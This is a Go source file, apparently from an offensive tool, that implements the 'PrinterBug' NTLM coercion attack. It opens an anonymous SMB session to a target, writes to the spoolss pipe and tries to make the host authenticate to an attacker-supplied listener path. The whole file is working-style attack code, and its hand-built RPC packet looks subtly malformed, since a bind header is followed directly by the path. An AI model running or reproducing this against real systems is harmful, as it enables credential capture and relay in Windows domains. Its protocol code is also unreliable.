// pkg/coercion/printerbug.go
package coercion

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"net"

	"github.com/hirochachacha/go-smb2"
)

// TriggerPrinterBug déclenche une coercion NTLM via MS-RPRN (PrinterBug)
func TriggerPrinterBug(target, listener string) error {
	tcpConn, err := net.Dial("tcp", target+":445")
	if err != nil {
		return fmt.Errorf("TCP connection failed : %w", err)
	}
	defer tcpConn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{User: "", Password: ""},
	}
	session, err := d.Dial(tcpConn)
	if err != nil {
		return fmt.Errorf("dial SMB failed : %w", err)
	}
	defer session.Logoff()

	fs, err := session.Mount("IPC$")
	if err != nil {
		return fmt.Errorf("IPC$ assembly failed : %w", err)
	}
	defer fs.Umount()

	pipe, err := fs.Open(`\pipe\spoolss`)
	if err != nil {
		return fmt.Errorf("pipe spool opening failed : %w", err)
	}
	defer pipe.Close()

	// CORRECTION : construction propre du payload
	uncPath := fmt.Sprintf(`\\%s\pipe\whatever`, listener)
	uncBytes := utf16leEncode(uncPath + "\x00")

	var buf bytes.Buffer
	// Header MS-RPRN (RpcRemoteFindFirstPrinterChangeNotificationEx)
	rpcHeader := []byte{
		0x05, 0x00,
		0x0b, 0x03,
		0x10, 0x00, 0x00, 0x00,
		0x48, 0x00,
		0x00, 0x00,
		0x01, 0x00, 0x00, 0x00,
	}
	buf.Write(rpcHeader)
	binary.Write(&buf, binary.LittleEndian, uint32(len(uncBytes)))
	buf.Write(uncBytes)

	payload := buf.Bytes()
	n, err := pipe.Write(payload)
	if err != nil {
		return fmt.Errorf("Payload sending failed : %w", err)
	}

	log.Printf("[+] PrinterBug : %d bytes sent (%s → %s)", n, target, listener)
	return nil
}
